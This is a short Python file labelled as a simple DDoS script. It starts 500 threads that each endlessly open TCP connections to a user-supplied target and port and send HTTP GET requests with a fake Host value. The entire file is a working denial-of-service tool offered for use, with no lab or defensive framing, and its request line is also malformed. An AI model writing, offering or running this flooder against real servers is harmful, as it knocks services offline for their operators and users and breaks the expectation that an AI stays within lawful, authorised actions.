#A very simple ddos script

import threading
import socket

target = '' #domain name or ip address
port = 80 #specify port
fake_ip = '192.21.20.32'

connected = 0

def attack ():
    """
    This function is the meat of the DDOS attack. It makes a new connection to the target server every time it is called, and then sends a GET request to the target, with the fake IP as the host value.
    """
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET/" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

        """
        global connected
        connected += 1
        if connected %500 == 0:
            print(connected)
        """

#Start 500 threads that will each call the attack function. Each thread will create a new connection to the target server and send a GET request with the fake IP as the host value.
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()

